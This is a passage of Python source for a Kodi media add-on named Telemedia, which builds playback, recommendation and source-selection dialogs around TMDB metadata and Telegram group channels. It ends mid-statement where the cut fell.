# -*- coding: utf-8 -*-
import socket,xbmcaddon,os,xbmc,xbmcgui,urllib,urllib2,re,xbmcplugin,sys,logging,shutil,time,xbmcvfs,json
__USERAGENT__ = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11'
__addon__ = xbmcaddon.Addon()
__cwd__ = xbmc.translatePath(__addon__.getAddonInfo('path')).decode("utf-8")
Addon = xbmcaddon.Addon()
try:
    import requests,pyxbmct
except:
    pass
global global_var,stop_all#global
global stopnext
stopnext =False
global_var=[]
import  threading
import mediaurl
update='עדכון מהיר זמין עבורכם'

UNAME            = mediaurl.UNAME


from resources.modules.globals import *
from resources.modules import cache as  cache
from resources.modules.public import addNolink,addDir3,addLink,lang,user_dataDir,addNolink2,addLink2,addLink3
from resources.modules.general import clean_name,check_link,server_data,replaceHTMLCodes,domain_s,similar,cloudflare_request,fix_q,call_trakt,post_trakt,reset_trakt,cloudflare_request,base_header
try:
    logo_path=os.path.join(user_dataDir, 'logo')
    tmdb_data_dir = os.path.join(addonPath, 'resources', 'tmdb_data')
    if not xbmcvfs.exists(logo_path+'/'):
         os.makedirs(logo_path)
    icons_path=os.path.join(user_dataDir, 'icons')
    if not xbmcvfs.exists(icons_path+'/'):
         os.makedirs(icons_path)
    fan_path=os.path.join(user_dataDir, 'fan')
    if not xbmcvfs.exists(fan_path+'/'):
         os.makedirs(fan_path)
    addon_path=os.path.join(user_dataDir, 'addons')
    if not xbmcvfs.exists(addon_path+'/'):
         os.makedirs(addon_path)
    addon_extract_path=os.path.join(user_dataDir, 'addons','temp')
    if not xbmcvfs.exists(addon_extract_path+'/'):
         os.makedirs(addon_extract_path)
except: pass
global break_jump,silent,clicked,selected_index
selected_index=-1
clicked=False
silent=False
break_jump=0

global id,playing_file,seek_time,exit_now
dir_path = os.path.dirname(os.path.realpath(__file__))
telemaia_icon=os.path.join(dir_path,'icon.png')
telemaia_fan=os.path.join(dir_path,'fanart.jpg')
exit_now=0
global list_index,str_next,sources_searching
sources_searching=False
str_next=''
list_index=999
import random
if Addon.getSetting("debug")=='false':
    reload(sys)  
    sys.setdefaultencoding('utf8')

KIDS_CHAT_ID=-1001195519301
KIDS_CHAT_ID2=-1001201872067
HEBREW_GROUP=-1001106800100
NATIO_NAL=-1001490514316
WORLD_GROUP=-1001000750206
WORLD_GROUP2=-1001292942479
DOCU=-1001178672944
TVSHOW=-1001082028679
HEBREWTV=-1001194005273
KIDS=-1001142678650
KIDS2=-1001247460404
KIDS3=-1001486957972
WAR=-1001340676794
HEBREW_GROUP2=-1001336230277

id=0
listen_port=Addon.getSetting("port")
seek_time=0
playing_file=False
FMANAGER  = {0:'com.android.documentsui',1:'com.android.documentsui'}[0]
socket.setdefaulttimeout(100.0)
cacheFile2 = os.path.join(user_dataDir, 'lastsubs.db')
import xml.etree.ElementTree as ET
global playing_text
playing_text=''
ACTION_PLAYER_STOP = 13
ACTION_BACK          = 92
ACTION_NAV_BACK =  92## Backspace action
ACTION_PARENT_DIR    = 9
ACTION_PREVIOUS_MENU = 10
ACTION_CONTEXT_MENU  = 117
ACTION_C_KEY         = 122

ACTION_LEFT  = 1
ACTION_RIGHT = 2
ACTION_UP    = 3
ACTION_DOWN  = 4
domain_s='https://'
from resources.modules.tmdb import html_g_movie
COLOR2='yellow'
COLOR1='white'
ADDONTITLE='Telemedia'
DIALOG         = xbmcgui.Dialog()
def LogNotify(title, message, times=2000, icon=telemaia_icon,sound=False):
	DIALOG.notification(title, message, icon, int(times), sound)
class fav_mv(xbmcgui.WindowXMLDialog):
    
    def __new__(cls, addonID,id):
        
        FILENAME='moviefavorite.xml'
        
        return super(fav_mv, cls).__new__(cls, FILENAME,Addon.getAddonInfo('path'), 'DefaultSkin')
        

    def __init__(self, addonID,id):
        super(fav_mv, self).__init__()
        self.id=id
        self.all_d={}
        self.closenow=0
        try:
            self.time_c=xbmc.Player().getTotalTime()-xbmc.Player().getTime()
        except:
            self.time_c=30
        
        #Thread(target=self.background_task).start()
        
        #Thread(target=self.get_similer).start()
    
    def onInit(self):
        a=1
        self.setFocus(self.getControl(201))
        x='http://api.themoviedb.org/3/movie/%s/recommendations?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%(self.id,lang)
        html=requests.get(x).json()
        loc=random.randint(0,len(html['results'])-1)
        self.all_d={}
        self.all_d['title']=html['results'][loc]['title']
        if 'poster_path' in html['results'][loc]:
            if html['results'][loc]['poster_path']!=None:
                self.all_d['icon']='https://image.tmdb.org/t/p/original/'+html['results'][loc]['poster_path']
            else:
                self.all_d['icon']=' '
                
       
        if 'backdrop_path' in html['results'][loc]:
            if html['results'][loc]['backdrop_path']!=None:
                self.all_d['fan']='https://image.tmdb.org/t/p/original/'+html['results'][loc]['backdrop_path']
            else:
                self.all_d['fan']=' '
        self.all_d['original_title']=html['results'][loc]['original_title']
        self.all_d['plot']=html['results'][loc]['overview']
        self.all_d['n_id']=html['results'][loc]['id']
        html_g=html_g_movie
        genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                if i['name'] is not None])
        try:self.all_d['genere'] = u' / '.join([genres_list[x] for x in html['results'][loc]['genre_ids']])
        except:self.all_d['genere']=''
        self.all_d['rating']=str(html['results'][loc]['vote_average'])
        if 'release_date' in html['results'][loc]:
            self.all_d['year']=str(html['results'][loc]['release_date'].split("-")[0])
        else:
            self.all_d['year']='0'
        #self.getControl(101).setImage(self.all_d['icon'])
        self.getControl(103).setImage(self.all_d['fan'])
        self.getControl(102).setLabel('[COLOR blue][B]'+self.all_d['title']+' - '+self.all_d['year']+ ' - '+self.all_d['rating']+'[/B][/COLOR]')
        self.getControl(104).setText(self.all_d['plot'])
        self.getControl(105).setLabel(self.all_d['genere'])
        
        Thread(target=self.background_task).start()
    def onAction(self, action):
        global stop_window,once_fast_play
        
        actionId = action.getId()

        if actionId in [ACTION_CONTEXT_MENU, ACTION_C_KEY]:
            
            stop_window=True
            #self.close_tsk=1
            
            
            return self.close()

        if actionId in [ACTION_PARENT_DIR, ACTION_PREVIOUS_MENU, ACTION_BACK]:
           
            stop_window=True
          
            return self.close()
    def background_task(self):
            global list_index
            t=int(self.time_c)*10
            counter_close=0
            self.progressControl = self.getControl(3014)
            e_close=0
            before_end=int(Addon.getSetting("movie_window"))*10
            counter_close2=before_end
            while(t>30):
                try:
                    t=(xbmc.Player().getTotalTime()-xbmc.Player().getTime())*10
                except:
                    pass
                self.label=self.getControl(3015)
                self.label.setLabel(('%s')%str(int(counter_close2)/10))
                self.label=self.getControl(3016)
                self.label.setLabel(('Movie ends in %s')%str(int(t)/10))
                counter_close2-=1
                if counter_close2==0:
                    t=0
                    break
                if t<counter_close2:
                    sh_p=t
                else:
                    sh_p=counter_close2
                self.currentProgressPercent=int((sh_p*100)/before_end)
           
                self.progressControl.setPercent(self.currentProgressPercent)
                xbmc.sleep(100)
                
                if self.closenow==1:
                    break
             
            self.close()

    def onClick(self, controlId):
        
        stop_window=True
        self.closenow=1
        if controlId==201:
            settings=Addon.getSetting
            fav_search_f=settings("fav_search_f_tv")
            fav_servers_en=settings("fav_servers_en_tv")
            fav_servers=settings("fav_servers_tv")
            google_server= settings("google_server_tv")
            rapid_server=settings("rapid_server_tv")
            direct_server=settings("direct_server_tv")
            heb_server=settings("heb_server_tv")
            if  fav_search_f=='true' and fav_servers_en=='true' and (len(fav_servers)>0 or heb_server=='true' or google_server=='true' or rapid_server=='true' or direct_server=='true'):
                
                fav_status='true'
            else:
                fav_status='false'
            xbmc.Player().stop()
            # str_next='ActivateWindow(10025,"plugin://plugin.video.telemedia/?nextup=true&url=%s&no_subs=0&season=%s&episode=%s&mode=15&original_title=%s&id=%s&dd=%s&show_original_year=%s&fanart=%s&iconimage=%s&name=%s&description=%s",return)'%('www','%20','%20',self.all_d['original_title'],self.all_d['n_id'],' ',self.all_d['year'],urllib.quote_plus(self.all_d['fan']),urllib.quote_plus(self.all_d['icon']),self.all_d['title'],urllib.quote_plus(self.all_d['plot'].encode('utf-8')))
            # xbmc.executebuiltin(str_next)
            xbmc.executebuiltin(('ActivateWindow(10025,"plugin://plugin.video.telemedia/?data=%s&dates=EMPTY&description=%s&eng_name=%s&episode=%s&fanart=%s&heb_name=%s&iconimage=%s&id=%s&isr=0&mode=15&name=%s&original_title=%s&season=%s&show_original_year=%s&tmdbid=EMPTY&url=%s&fast_link=%s&fav_status=%s",return)'%(self.all_d['year'],urllib.quote_plus(self.all_d['plot'].encode('utf-8')),self.all_d['original_title'],str(int(0)),urllib.quote_plus(self.all_d['fan']),self.all_d['title'],urllib.quote_plus(self.all_d['icon']),self.all_d['n_id'],self.all_d['title'],self.all_d['original_title'],'0',self.all_d['year'],' ',' ',fav_status)).replace('EMPTY','%20'))
        # plugin://plugin.video.telemedia/?url=%s&no_subs=%s&season=%s&episode=%s&mode=40&original_title=%s&id=%s&data=&fanart=&url=%s&iconimage=&file_name=%s&description=%s&resume=%s&name=%s&heb_name=%s'%(url_id,no_subs,season,episode,original_title.decode('utf-8','ignore').encode("utf-8"),id,url_id,saved_name.decode('utf-8','ignore').encode("utf-8"),'_from_victory_',set_runtime,saved_name,heb_name)
      
        self.close()
        
    
    def onFocus(self, controlId):
        pass 
class UpNext(xbmcgui.WindowXMLDialog):
    item = None
    cancel = False
    watchnow = False
    
    progressStepSize = 0
    currentProgressPercent = 100

    def __init__(self, *args, **kwargs):
        logging.warning('INIT UPNEXT')
        global clicked
        from platform import machine
        OS_MACHINE = machine()
        self.closenow=0
        clicked=False
        self.action_exitkeys_id = [10, 13]
        logging.warning('INIT UPNEXT0')
        self.progressControl = None
        if OS_MACHINE[0:5] == 'armv7':
            xbmcgui.WindowXMLDialog.__init__(self)
        else:
            xbmcgui.WindowXMLDialog.__init__(self, *args, **kwargs)
        logging.warning('INIT UPNEXT2')
        
   
    def background_task(self):
        global list_index
        t=int(self.time_c)*10
        counter_close=0
        self.progressControl = self.getControl(3014)
        e_close=0
        before_end=int(Addon.getSetting("before_end2"))*10
        counter_close2=t-before_end
        #logging.warning('counter_close2_t:'+str(t))
        while(t>30):
            self.label=self.getControl(3015)
            self.label.setLabel(('%s seconds')%str(int(counter_close2)/10))
            
            counter_close2-=1
            #logging.warning('counter_close2:'+str(counter_close2))
            
            if counter_close2==0:
                t=0
                break
            self.currentProgressPercent=int((counter_close2*100)/before_end)
       
            self.progressControl.setPercent(self.currentProgressPercent)
            xbmc.sleep(100)
            t-=1
            if self.closenow==1:
                break
        if self.closenow==0:
            list_index=self.list.getSelectedPosition()        
        self.close()
    def onInit(self):
        self.time_c=30
        try:
            self.time_c=xbmc.Player().getTotalTime()-xbmc.Player().getTime()
        except:
            self.time_c=30
        
        
            
        self.list = self.getControl(3000)
        self.but = self.getControl(3012)
        for it in self.item['list']:
         
          
          liz   = xbmcgui.ListItem(it.split('$$$$$$$')[0])
          self.list.addItem(liz)
       
        
        self.setFocus(self.but)
        logging.warning('INIT UPNEXT1')
        Thread(target=self.background_task).start()
        self.setInfo()
        self.prepareProgressControl()

    def setInfo(self):
        logging.warning('INIT UPNEXT2')
       
        episodeInfo = str(self.item['season']) + 'x' + str(self.item['episode']) + '.'
        if self.item['rating'] is not None:
            rating = str(round(float(self.item['rating']), 1))
        else:
            rating = None
        
        if self.item is not None:
            self.setProperty(
                'fanart', self.item['art'].get('tvshow.fanart', ''))
            self.setProperty(
                'landscape', self.item['art'].get('tvshow.landscape', ''))
            self.setProperty(
                'clearart', self.item['art'].get('tvshow.clearart', ''))
            self.setProperty(
                'clearlogo', self.item['art'].get('tvshow.clearlogo', ''))
            self.setProperty(
                'poster', self.item['art'].get('tvshow.poster', ''))
            self.setProperty(
                'thumb', self.item['art'].get('thumb', ''))
            self.setProperty(
                'plot', self.item['plot'])
            self.setProperty(
                'tvshowtitle', self.item['showtitle'])
            self.setProperty(
                'title', self.item['title'])
            self.setProperty(
                'season', str(self.item['season']))
            self.setProperty(
                'episode', str(self.item['episode']))
            self.setProperty(
                'seasonepisode', episodeInfo)
            self.setProperty(
                'year', str(self.item['firstaired']))
            self.setProperty(
                'rating', rating)
            self.setProperty(
                'playcount', str(self.item['playcount']))

    def prepareProgressControl(self):
        logging.warning('INIT UPNEXT3')
        # noinspection PyBroadException
        try:
            self.progressControl = self.getControl(3014)
            if self.progressControl is not None:
                self.progressControl.setPercent(self.currentProgressPercent)
        except Exception:
            pass

    def setItem(self, item):
        self.item = item

    def setProgressStepSize(self, progressStepSize):
        self.progressStepSize = progressStepSize

    def updateProgressControl(self):
        # noinspection PyBroadException
        try:
            self.currentProgressPercent = self.currentProgressPercent - self.progressStepSize
         
            self.progressControl = self.getControl(3014)
           
            if self.progressControl is not None:
                self.progressControl.setPercent(self.currentProgressPercent)
        except Exception:
            pass

    def setCancel(self, cancel):
        self.cancel = cancel

    def isCancel(self):
        return self.cancel

    def setWatchNow(self, watchnow):
        self.watchnow = watchnow

    def isWatchNow(self):
        return self.watchnow

    def onFocus(self, controlId):
        pass

    def doAction(self):
        pass

    def closeDialog(self):
        self.close()

    def onClick(self, control_id):
        global list_index,clicked
        
        if control_id == 3012:
            # watch now
            clicked=True
            list_index=0
            self.setWatchNow(True)
            self.closenow=1
            self.close()
            
        elif control_id == 3013:
            # cancel
            clicked=False
            list_index=888
            self.setCancel(True)
            self.closenow=1
            self.close()
        elif control_id == 3000:
            clicked=True
            index = self.list.getSelectedPosition()        
            list_index=index
            self.closenow=1
            self.close()
        pass

    def onAction(self, action):
        
        if action == ACTION_PLAYER_STOP:
            self.closenow=1
            self.close()
class ContextMenu_new2(xbmcgui.WindowXMLDialog):
    
    def __new__(cls, addonID, menu,icon,fan,txt):
        #FILENAME='contextmenu_new2.xml'
        #if Addon.getSetting("new_window_type2")=='4':
        FILENAME='contextmenu_new3.xml'
        logging.warning(Addon.getAddonInfo('path'))
        return super(ContextMenu_new2, cls).__new__(cls, FILENAME,Addon.getAddonInfo('path'), 'DefaultSkin')
        

    def __init__(self, addonID, menu,icon,fan,txt):
        global playing_text,selected_index
        logging.warning('Init')
        super(ContextMenu_new2, self).__init__()
        self.menu = menu
        self.auto_play=0
        selected_index=-1
        self.params    = 666666
        self.imagecontrol=101
        self.bimagecontrol=5001
        self.txtcontrol=2
        self.tick_label=6001
        self.icon=icon
        self.fan=fan
        self.text=txt
        playing_text=''
        self.tick=60
        self.done=0
        self.story_gone=0
        self.count_p=0
        self.keep_play=''
        self.tick=60
        self.s_t_point=0
        self.start_time=time.time()
        logging.warning('dInit')
    def background_work(self):
        global playing_text,mag_start_time_new,now_playing_server,done1_1
        tick=0
        tick2=0
        changed=1
        vidtime=0
        while(1):
            
            all_t=[]
            for thread in threading.enumerate():
                if ('tick_time' in thread.getName()) or ('background_task' in thread.getName()) or ('get_similer' in thread.getName()) or ('MainThread' in thread.getName()) or ('sources_s' in thread.getName()):
                    continue
                
                if (thread.isAlive()):
                    all_t.append( thread.getName())
            self.getControl(606).setLabel(','.join(all_t))
            if  xbmc.getCondVisibility('Window.IsActive(busydialog)'):
                self.getControl(102).setVisible(True)
                if tick2==1:
                    self.getControl(505).setVisible(True)
                    tick2=0
                else:
                    self.getControl(505).setVisible(False)
                    tick2=1
            else:
                self.getControl(102).setVisible(False)
                self.getControl(505).setVisible(False)
            if len(playing_text)>0 or  self.story_gone==1 :
                changed=1
                vidtime=0
                if xbmc.Player().isPlaying():
                    vidtime = xbmc.Player().getTime()
                
                t=time.strftime("%H:%M:%S", time.gmtime(vidtime))
                
                if len(playing_text)==0:
                    playing_text=self.keep_play
                try:
                    self.keep_play=playing_text
                    self.getControl(self.txtcontrol).setText(t+'\n'+playing_text.split('$$$$')[0]+'\n'+now_playing_server.split('$$$$')[0]+'\n'+now_playing_server.split('$$$$')[1])
                    if vidtime == 0:
                        if tick==1:
                            self.getControl(303).setVisible(True)
                            tick=0
                        else:
                            self.getControl(303).setVisible(False)
                            tick=1
                except Exception as e:
                    logging.warning('Skin ERR:'+str(e))
                    self.params = 888
                    self.done=1
                    logging.warning('Close:4')
                    xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
                    done1_1=3
                    self.close()
                    pass
            
            elif changed==1:
                    changed=0
                
                    self.getControl(303).setVisible(False)
                    self.getControl(self.txtcontrol).setText(self.text)
            
            if self.done==1:
                break
            if xbmc.Player().isPlaying():
                self.tick=60
                self.count_p+=1
                self.st_time=0
                
                vidtime = xbmc.Player().getTime()
                if self.s_t_point==0:
                    
                    
                    if vidtime > 0:
                        self.getControl(3000).setVisible(False)
                        self.getControl(self.imagecontrol).setVisible(False)
                        self.getControl(505).setVisible(False)
                        self.getControl(909).setPosition(1310, 40)
                        self.getControl(2).setPosition(1310, 100)
                        self.s_t_point=1
                        self.getControl(303).setVisible(False)
                        self.story_gone=1
                        logging.warning('Change seek Time:'+str(mag_start_time_new))
                        try:
                            if int(float(mag_start_time_new))>0:
                                xbmc.Player().seekTime(int(float(mag_start_time_new)))
                        except:
                            pass
                
                if vidtime > 0:
                    playing_text=''
     
                try:
                    value_d=(vidtime-(int(float(mag_start_time_new)))) 
                except:
                    value_d=vidtime
                play_time=int(Addon.getSetting("play_full_time"))
                if value_d> play_time and self.s_t_point>0:
                    self.params = 888
                    self.done=1
                    logging.warning('Close:1')
                    xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
                    done1_1=3
                    self.close()
              
                if self.count_p>(play_time+30) :
                   if Addon.getSetting("play_first")!='true':
                   
                    self.params = 888
                    self.done=1
                    logging.warning('Close:3')
                    xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
                    done1_1=3
                    self.close()
            else:
                self.count_p=0
                self.s_t_point=0
                self.getControl(3000).setVisible(True)
         
                #self.getControl(505).setVisible(True)
                self.getControl(self.imagecontrol).setVisible(True)
                self.story_gone=0
                self.getControl(2).setPosition(1310, 700)
                self.getControl(909).setPosition(1310, 10)
            xbmc.sleep(1000)
    def tick_time(self):
        global done1_1
        while(self.tick)>0:
            self.getControl(self.tick_label).setLabel(str(self.tick))
            self.tick-=1
            
            if self.params == 888:
                break
            xbmc.sleep(1000)
        if self.params != 888:
            self.params = 888
            self.done=1
            logging.warning('Close:93')
            xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
            done1_1=3
            self.close()
    def fill_table(self,all_his_links):
        logging.warning('Start Fill')
        count=0
        self.paramList = []
        all_liz_items=[]
        try:
            for item in self.menu:
                self.getControl(202).setLabel(str(((count*100)/len(self.menu))) + '% Please Wait ')
                count+=1
                self.paramList.append(item[6])
                '''
                info=(PTN.parse(item[0]))
                if 'excess' in info:
                    if len(info['excess'])>0:
                        item[0]='.'.join(info['excess'])
                '''
                golden=False
                if 'Cached ' in item[0]:
                    golden=True
                item[0]=item[0].replace('Cached ','')
                if len(item[0])>45 and '►►►' not in item[0]:
                #    item[0]="\n".join(textwrap.wrap(item[0],60))
                     item[0]=item[0][0:45]+'\n'+item[0][45:len(item[0])]
                title ='[B]'+item[0] +'[/B]'
                if len(item[1].strip())<2:
                    item[1]=''
                if len(item[2].strip())<2:
                    item[2]='--'
                if len(item[3].strip())<2:
                    item[3]=''
                if len(item[4])<2:
                    item[4]=''
                if len(item[5])<2:
                    item[5]=''
                server=item[1]
                pre_n='[COLOR khaki]'+item[2]+'[/COLOR]'
                q=item[3]
                supplay='[COLOR lightblue]'+item[4]+'[/COLOR]'
                size='[COLOR coral]'+item[5]+'[/COLOR]'
                link=item[6]
                
                if item[7]==True or ('magnet' in server and allow_debrid):
                    supplay='[COLOR yellow][I]RD - '+supplay+'[/I][/COLOR]'
              
                if '►►►' in item[0]:
                    
                    title=''
                    supplay=item[0]
               
                
                if q=='2160':
                    q='4k'
                liz   = xbmcgui.ListItem(title)
                liz.setProperty('server', server)
                liz.setProperty('pre',pre_n)
                liz.setProperty('Quality', q)
                liz.setProperty('supply', supplay)
                liz.setProperty('size', size)
                if item[6].encode('base64') in all_his_links:
                    liz.setProperty('history','100')
                if '►►►' not in item[0]:
                    liz.setProperty('server_v','100')
                if item[7]==True or ('magnet' in server and allow_debrid):
                    liz.setProperty('rd', '100')
                if golden:
                    liz.setProperty('magnet', '200')
                
                elif 'magnet' in server:
                    liz.setProperty('magnet', '100')
                all_liz_items.append(liz)
            logging.warning(' Done Loading')
            self.getControl(202).setLabel('')
            self.list.addItems(all_liz_items)

            self.setFocus(self.list)
        except Exception as e:
            logging.warning('Fill error:'+str(e))
        
    def onInit(self):
        logging.warning('Start')
        xbmc.Player().stop()
        xbmc.executebuiltin('Dialog.Close(busydialog)')
        #dbcur.execute("SELECT * FROM historylinks")
        #all_his_links_pre = dbcur.fetchall()
        all_his_links=[]
        #for link,status,option in all_his_links_pre:
        #    all_his_links.append(link)
        thread=[]
        #thread.append(Thread(self.background_work))
        #thread[len(thread)-1].setName('background_task')
        #thread.append(Thread(self.tick_time))
        #thread[len(thread)-1].setName('tick_time')
        thread.append(Thread(self.fill_table,all_his_links))
        thread[len(thread)-1].setName('fill_table')
        logging.warning('trd s')
        thread[0].start()
        #thread[1].start()
        #thread[2].start()
        line   = 38
        spacer = 20
        delta  = 0 
        logging.warning('1')
        nItem = len(self.menu)
        if nItem > 16:
            nItem = 16
            delta = 1
        logging.warning('2')
        self.getControl(self.imagecontrol).setImage(self.icon)
        self.getControl(self.bimagecontrol).setImage(self.fan)
        logging.warning('3')
        if len(playing_text)==0:
            self.getControl(self.txtcontrol).setText(self.text)
        height = (line+spacer) + (nItem*line)
        height=1100
        self.getControl(5001).setHeight(height)
        logging.warning('4')
        self.list = self.getControl(3000)
        self.list.setHeight(height)
        logging.warning('5')
        newY = 360 - (height/2)

        self.getControl(5000).setPosition(self.getControl(5000).getX(), 0)
        
       
        
        
        
        #txt='[COLOR deepskyblue]'+name.replace('-',' ').replace('%20',' ').strip()+'[/COLOR]\nServer: '+server+' Subs: '+str(pre_n)+'  Quality:[COLOR gold] ◄'+q+'► [/COLOR]Provider: [COLOR lightblue]'+supplay+'[/COLOR] Size:[COLOR coral]'+size+'[/COLOR]$$$$$$$'+link
        #import textwrap
        
        
        
        logging.warning('Loading')
        
        
            
           
    def played(self):
        self.params =7777
    def onAction(self, action):  
        global done1_1,selected_index
        actionId = action.getId()
        #logging.warning('actionId:'+str(actionId))
        self.tick=60
        #logging.warning('ACtion:'+ str(actionId))
        
            
        if actionId in [ACTION_CONTEXT_MENU, ACTION_C_KEY]:
            logging.warning('Close:5')
            self.params = 888
            selected_index=-1
            
            self.close()

        if actionId in [ACTION_PARENT_DIR, ACTION_PREVIOUS_MENU, ACTION_BACK,ACTION_NAV_BACK]:
            self.params = 888
            selected_index=-1
            self.close()

    
    def onClick(self, controlId):
        global playing_text,done1_1,selected_index
        self.tick=60
        
        if controlId != 3001:
            '''
            self.getControl(3000).setVisible(False)
            self.getControl(102).setVisible(False)
            self.getControl(505).setVisible(False)
            self.getControl(909).setPosition(1310, 40)
            self.getControl(2).setPosition(1310, 100)
            self.getControl(self.imagecontrol).setVisible(False)
            self.getControl(303).setVisible(False)
            self.story_gone=1
            '''
            index = self.list.getSelectedPosition()        
            
            try:    
                self.params = index
                logging.warning('Clicked:'+str(controlId)+':'+str(index))
            except:
                self.params = None
            #playing_text=''
            xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
            selected_index=self.params
            self.close()
            #return self.params
        else:
            logging.warning('Close:7')
            selected_index=-1
            self.close()
        
    def close_now(self):
        global done1_1
        logging.warning('Close:8')
        self.params = 888
        self.done=1
        xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )
        xbmc.sleep(1000)
        logging.warning('Close now CLosing')
        done1_1=3
        self.close()
    def onFocus(self, controlId):
        pass
class OverlayText:
    def __init__(self):
        logging.warning('(Overlay) Initialize overlay text')
        x, y, w, h = self._calculate_the_size()

        self._shown       = False
        self._window     = xbmcgui.Window(12005)
        self._label      = xbmcgui.ControlLabel(x, y, w, h, '', alignment=0x00000002 | 0x00000004)
        media_path=os.path.join(xbmc.translatePath(Addon.getAddonInfo("path")).decode("utf-8"),'resources','media')
        self._background = xbmcgui.ControlImage(x, y, w, h, os.path.join(media_path, "black.png"))

        self._background.setColorDiffuse("0xD0000000")

    def __enter__(self):
        return self

    def open(self):
        if not self._shown:
            self._window.addControls([self._background, self._label])
            self._shown = True

    def isShowing(self):
        return self._shown

    def setText(self, text):
        if self._shown:
            self._label.setLabel(text)

    def _calculate_the_size(self):
        # get skin resolution
        tree = ET.parse(os.path.join(xbmc.translatePath("special://skin/"), "addon.xml"))
        res = tree.findall("./extension/res")[0]
        viewport_w = int(res.attrib["width"])
        viewport_h = int(res.attrib["height"])
        # Adjust size based on viewport, we are using 1080p coordinates
        w = int(int(1920.0 * 0.7) * viewport_w / 1920.0)
        h = int(150 * viewport_h / 1088.0)
        x = (viewport_w - w) / 2
        y = (viewport_h - h) / 2
        return x, y, w, h

    def __exit__(self, *exc_info):
        self.close()
        return not exc_info[0]

    def __del__(self):
        self.close()

    def close(self):
        if hasattr(self, '_background') and self._shown:
            self._window.removeControls([self._background, self._label])
            self._shown = False

def log(txt):
    logging.warning(txt)

try:
 class selection_time(pyxbmct.AddonDialogWindow):
    
    def __init__(self, title='',item=''):
       
        super(selection_time, self).__init__(title)
        #'Play from beginning'
        self.item=[item,Addon.getLocalizedString(32043)]
        self.setGeometry(350, 180,2, 1,pos_x=600, pos_y=200)
        self.list_index=-1

        self.clicked=0
        self.getWindowTitle()
        self.set_active_controls()
        self.set_navigation()
        # Connect a key action (Backspace) to close the window.
        self.connect(pyxbmct.ACTION_NAV_BACK, self.close)
    def getWindowTitle(self):
        self.setWindowTitle('נגן מאיפה שהופסק')
    def get_selection(self):
        """ get final selection """
        return self.list_index
    def click_list(self):
        self.clicked=1
        self.list_index=self.list.getSelectedPosition()
       
        self.close()
    
    def set_active_controls(self):
     
      
        # List
        self.list = pyxbmct.List(font ='font15')
        self.placeControl(self.list, 0,0,  rowspan=2)
        # Add items to the list
        
       
        self.list.addItems(self.item)
        
        # Connect the list to a function to display which list item is selected.
        self.connect(self.list, self.click_list)
        
       

    def set_navigation(self):
        
        self.setFocus(self.list)

    

    

    def setAnimation(self, control):
        # Set fade animation for all add-on window controls
        control.setAnimations([('WindowOpen', 'effect=fade start=0 end=100 time=0',),
                                ('WindowClose', 'effect=fade start=100 end=0 time=0',)])
except:
    pass

def clear_files():
    try:
        db_path=os.path.join(user_dataDir, 'files','temp')
        if os.path.exists(db_path):
            onlyfiles = [f for f in os.listdir(db_path) if os.path.isfile(os.path.join(db_path, f).encode('utf-8'))]
            
            for fl in onlyfiles:
                #dp.update(0, 'Please Wait...','Removing File', fl )
                re_fl=os.path.join(db_path,fl).encode('utf-8')
                
                if os.path.exists(re_fl):
                  try:
                    os.remove(re_fl)
                  except Exception as e:
                    logging.warning('Err:'+str(e))
                    pass
        db_path=os.path.join(user_dataDir, 'files','documents')
        if os.path.exists(db_path):
            onlyfiles = [f for f in os.listdir(db_path) if os.path.isfile(os.path.join(db_path, f).encode('utf-8'))]
            for fl in onlyfiles:
                #dp.update(0, 'Please Wait...','Removing File', fl )
                re_fl=os.path.join(db_path,fl).encode('utf-8')
                if os.path.exists(re_fl):
                  try:
                    os.remove(re_fl)
                  except:
                    pass
        
        db_path=os.path.join(user_dataDir, 'files','videos')
        if os.path.exists(db_path):
            onlyfiles = [f for f in os.listdir(db_path) if os.path.isfile(os.path.join(db_path, f).encode('utf-8'))]
            for fl in onlyfiles:
                #dp.update(0, 'Please Wait...','Removing File', fl )
                re_fl=os.path.join(db_path,fl).encode('utf-8')
                if os.path.exists(re_fl):
                  try:
                    os.remove(re_fl)
                  except:
                    pass
        db_path=os.path.join(user_dataDir, 'files','photos')
        if os.path.exists(db_path):
            onlyfiles = [f for f in os.listdir(db_path) if os.path.isfile(os.path.join(db_path, f).encode('utf-8'))]
            for fl in onlyfiles:
                #dp.update(0, 'Please Wait...','Removing File', fl )
                re_fl=os.path.join(db_path,fl).encode('utf-8')
                if os.path.exists(re_fl):
                  try:
                    os.remove(re_fl)
                  except:
                    pass
        db_path=os.path.join(user_dataDir, 'files','music')
        if os.path.exists(db_path):
            onlyfiles = [f for f in os.listdir(db_path) if os.path.isfile(os.path.join(db_path, f).encode('utf-8'))]
            for fl in onlyfiles:
                #dp.update(0, 'Please Wait...','Removing File', fl )
                re_fl=os.path.join(db_path,fl).encode('utf-8')
                if os.path.exists(re_fl):
                  try:
                    os.remove(re_fl)
                  except:
                    pass
    except Exception as e:
        logging.warning('Error removing files:'+str(e))
class Thread(threading.Thread):
    def __init__(self, target, *args):
       
        self._target = target
        self._args = args
        
        
        threading.Thread.__init__(self)
        
    def run(self):
        
        self._target(*self._args)

    
def is_hebrew(input_str):    
       try:
        import unicodedata
        input_str=input_str.replace(' ','').replace('\n','').replace('\r','').replace('\t','').replace(' ','')
        nfkd_form = unicodedata.normalize('NFKD', input_str.replace(' ','').replace('\n','').replace('\r','').replace('\t','').replace(' ',''))
        a=False
        for cha in input_str:
            
            a='HEBREW' in unicodedata.name(cha.strip())
            if a:
                break
        return a
       except:
            return True
        
class TelePlayer(xbmc.Player):
    def __init__(self, *args, **kwargs):
       
        self.g_timer=0
        self.g_item_total_time=0
        xbmc.Player.__init__(self)
        
    def onPlayBackStarted(self):
        global id,playing_file
        self.g_timer=0
        log('(Tele Player) onPlayBackStarted')
        playing_file=True
    def onPlayBackResumed(self):
        global id,playing_file
        log('(Tele Player) onPlayBackResumed')
        playing_file=True

    def onPlayBackPaused(self):
        global id,playing_file
        log('(Tele Player) onPlayBackPaused')
        playing_file=True
    def onPlayBackEnded(self):
        global id,playing_file
        log('(Tele Player) Ended playback')
        num=random.randint(0,60000)
        data={'type':'td_send',
